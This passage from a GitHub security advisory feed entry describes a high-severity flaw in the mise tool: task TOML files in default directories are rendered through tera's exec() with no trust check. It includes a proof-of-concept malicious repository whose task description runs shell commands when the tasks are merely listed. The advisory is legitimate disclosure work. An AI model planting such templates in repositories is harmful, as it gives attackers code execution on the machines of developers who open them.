<li><code>src/config/config_file/tool_versions.rs:62</code> — <code>.tool-versions</code> parser → <code>trust_check(&amp;path)?</code></li>
<li><code>src/config/env_directive/mod.rs:681</code> — env templates → <code>trust_check(path)?</code> (only when the value contains template syntax)</li>
</ul>
<p>Task-include files are loaded by <code>load_tasks_in_dir</code> / <code>load_local_tasks_with_context</code>,
which walk every directory from CWD up to root. For each directory, <code>configs_at_root</code>
returns the parsed (trusted) configs rooted there; <strong>if there is no config in the
directory</strong>, mise falls back to the default task-include list resolved relative to that
directory and loads whatever it finds — with no trust check:</p>
<p><code>src/config/mod.rs</code> (<code>load_tasks_in_dir</code>, ~2586):</p>
<pre><code class="language-rust">let (includes, resolve_dir) = configs
    .iter()
    .find_map(|cf| match cf.task_config_includes() { … })
    .transpose()?
    .unwrap_or_else(|| (default_task_includes(), dir.to_path_buf())); // no config -&gt; default includes
…
for include in &amp;includes {
    let paths = … expand_task_include(&amp;resolve_dir, include);
    for p in paths {
        let mut loaded = load_tasks_includes(config, &amp;p, dir, &amp;task_config_dir, templates).await?;
        …
    }
}
</code></pre>
<p><code>default_task_includes()</code> (<code>src/config/mod.rs:1825</code>):</p>
<pre><code class="language-rust">vec!["mise-tasks", ".mise-tasks", ".mise/tasks", ".config/mise/tasks", "mise/tasks"]
</code></pre>
<p><code>load_task_file</code> (<code>src/config/mod.rs:2645</code>) reads the TOML directly with no trust check
and renders each task:</p>
<pre><code class="language-rust">let raw = file::read_to_string_async(path).await?;
let mut tasks = toml::from_str::&lt;Tasks&gt;(&amp;raw) … ;        // no trust_check
…
resolve_task_template(&amp;mut task, templates)?;
if let Err(err) = task.render(config, &amp;config_root).await { … }  // renders tera, incl. exec()
</code></pre>
<p><code>Task::render</code> (<code>src/task/mod.rs:1475</code>) renders many fields through tera, and the tera
instance is built with <code>get_tera(Some(config_root))</code>:</p>
<pre><code class="language-rust">let mut tera = get_tera(Some(config_root));
…
if contains_template_syntax(&amp;self.description) {
    self.description = render_str(&amp;mut tera, &amp;self.description, &amp;tera_ctx)?;
}
</code></pre>
<p><code>get_tera</code> (<code>src/tera.rs:407</code>) registers the command-executing functions:</p>
<pre><code class="language-rust">pub fn get_tera(dir: Option&lt;&amp;Path&gt;) -&gt; Tera {
    let mut tera = TERA.clone();
    let dir = dir.map(PathBuf::from);
    tera.register_function("exec", tera_exec(dir.clone(), env::PRISTINE_ENV.clone()));
    tera.register_function("read_file", tera_read_file(dir));
    tera
}
</code></pre>
<p>So a tera <code>{{ exec(command='…') }}</code> placed in any rendered task field
(<code>description</code>, <code>dir</code>, <code>shell</code>, <code>sources</code>, <code>aliases</code>, <code>depends</code>, <code>tools</code>, …) of a TOML
task file — or in a <code>#MISE description="…"</code> header of an executable script task
(<code>Task::from_path</code>) — executes when the task is merely <em>loaded for listing</em>, with no
trust prompt. <code>exec()</code> is not gated by <code>experimental</code> (default <code>experimental = false</code>).</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Tested against the prebuilt release binary, <code>mise 2026.6.4 linux-x64</code>, with a
pristine <code>HOME</code> so nothing is pre-trusted.</p>
<p>Repo layout :</p>
<pre><code>malicious-repo/
└── mise-tasks/
    └── ci.toml
</code></pre>
<p><code>mise-tasks/ci.toml</code>:</p>
<pre><code class="language-toml">[test]
description = "{{ exec(command='id &gt; /tmp/mise_clone_proof.txt; hostname &gt;&gt; /tmp/mise_clone_proof.txt') }}"
run = "cargo test"
</code></pre>
<p>Trigger (any of these; a victim who has <code>mise activate</code> set up hits the last one by just
pressing Tab to complete a task name):</p>
<pre><code class="language-bash">export HOME="$(mktemp -d)"          # nothing pre-trusted
export MISE_TRUSTED_CONFIG_PATHS=""
cd malicious-repo
mise tasks            # or: mise task ls / mise run / mise tasks --usage
</code></pre>
<p>output:</p>
<pre><code>test
</code></pre>
<p>and the side effect :</p>
<pre><code>miau@linux:~$ cat /tmp/mise_clone_proof.txt
uid=1000(miau) gid=1000(miau) groups=1000(miau)…
linux 
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-77g9-363w-rccq">https://github.com/jdx/mise/security/advisories/GHSA-77g9-363w-rccq</a></li>
<li><a href="https://github.com/advisories/GHSA-77g9-363w-rccq">https://github.com/advisories/GHSA-77g9-363w-rccq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77g9-363w-rccq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:24:08.000Z</published>
    </entry>
</feed>